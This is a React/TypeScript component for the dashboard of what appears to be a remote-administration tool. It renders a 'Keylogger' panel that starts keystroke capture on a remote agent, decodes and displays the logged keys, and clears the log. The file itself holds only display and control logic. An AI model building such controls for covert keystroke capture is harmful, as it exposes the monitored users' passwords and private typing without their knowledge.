import { useMemo } from 'react';
import { useModalEscape } from '../hooks/useModalEscape';
import { formatKeylogDisplay, type KeylogTargetOs } from '../utils/formatKeylogDisplay';

type KeyloggerModalProps = {
  open: boolean;
  targetLabel: string;
  /** OS of the remote PC (fallback when log lines do not contain vk=/keycode=). */
  targetOs: KeylogTargetOs;
  running: boolean;
  content: string;
  busy: boolean;
  /** Local display cleared: polling is paused until user resumes or fetches from agent again. */
  viewCleared: boolean;
  onClose: () => void;
  onStart: () => void;
  onClearLog: () => void;
  /** Fetches the latest keylog from the agent and shows it again. */
  onResumeView: () => void;
};

function KeyloggerModal({
  open,
  targetLabel,
  targetOs,
  running,
  content,
  busy,
  viewCleared,
  onClose,
  onStart,
  onClearLog,
  onResumeView,
}: KeyloggerModalProps) {
  useModalEscape(open, onClose);

  const decodedText = useMemo(() => formatKeylogDisplay(content, targetOs), [content, targetOs]);

  const logBody = useMemo(() => {
    if (viewCleared && !content.trim()) {
      return '(log view cleared — use Show from agent to load the remote keylog again)';
    }
    if (decodedText.length > 0) {
      return decodedText;
    }
    if (content.trim()) {
      return content;
    }
    return '(waiting for keyboard activity...)';
  }, [viewCleared, content, decodedText]);

  if (!open) return null;

    return (
        <div className="modal-backdrop" onClick={onClose} role="presentation">
            <div
                className="modal-panel process-modal"
                onClick={(event) => event.stopPropagation()}
                role="dialog"
                aria-modal="true"
                aria-labelledby="keylogger-title"
            >
                <div className="modal-header">
                    <div>
                        <h2 id="keylogger-title">Keylogger</h2>
                        <p className="modal-sub">
                            {targetLabel} · status {running ? 'Running' : 'Stopped'}
                            {viewCleared && ' · log view cleared (updates paused)'}
                        </p>
                    </div>

                    <button className="btn modal-close" onClick={onClose} type="button">
                        Close
                    </button>
                </div>

                <div className="process-modal-toolbar">
                    <button
                        className="btn primary"
                        disabled={busy || running}
                        onClick={onStart}
                        type="button"
                    >
                        Start
                    </button>

                    <button
                        className="btn btn-danger"
                        disabled={busy || !running || viewCleared}
                        onClick={onClearLog}
                        type="button"
                    >
                        Clear log
                    </button>

                    {viewCleared && (
                        <button
                            className="btn"
                            disabled={busy || !running}
                            onClick={onResumeView}
                            type="button"
                        >
                            Show from agent
                        </button>
                    )}
                </div>

                <div className="process-table-wrap">
                    <p className="modal-sub keylogger-log-hint">
                        Nội dung gõ trên máy server sẽ hiển thị bên dưới (đã đổi vk/keycode thành ký tự; QWERTY, không
                        biết Shift/Caps — chữ A–Z hiển thị dạng thường).
                    </p>

                    <pre
                        className="modal-body-inline"
                        style={{
                            whiteSpace: 'pre-wrap',
                            wordBreak: 'break-word',
                            minHeight: 220,
                        }}
                    >
                        {logBody}
                    </pre>
                </div>
            </div>
        </div>
    );
}

export default KeyloggerModal;